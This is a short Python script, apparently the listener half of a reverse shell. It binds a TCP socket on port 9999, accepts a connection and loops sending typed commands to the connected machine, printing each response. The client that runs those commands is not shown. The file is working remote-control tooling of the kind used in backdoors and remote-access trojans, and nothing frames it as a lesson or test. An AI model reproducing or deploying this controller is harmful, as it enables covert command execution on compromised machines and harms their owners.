from http import server
import socket
import sys
import os


def bind_socket():
    try:
        global SERVER
        global PORT
        global sock
        SERVER = socket.gethostbyname(socket.gethostname())
        print(SERVER)
        PORT = 9999
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ADDR = (SERVER, PORT)
        sock.bind(ADDR)
        sock.listen(3)

    except socket.error as msg:
        print("[Socket Error]"+'\n'+str(msg))
        bind_socket()


def socket_accept():
    conn, addr = sock.accept()
    print("[Connected Sucessfully] :"+" ip |" +
          addr[0]+"| port |"+str(addr[1]))
    send_comm(conn)
    conn.close


def send_comm(conn):
    while True:
        print("\n")
        cmd = input("$> ")
        if cmd == "quit":
            conn.close()
            sock.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")


bind_socket()
socket_accept()
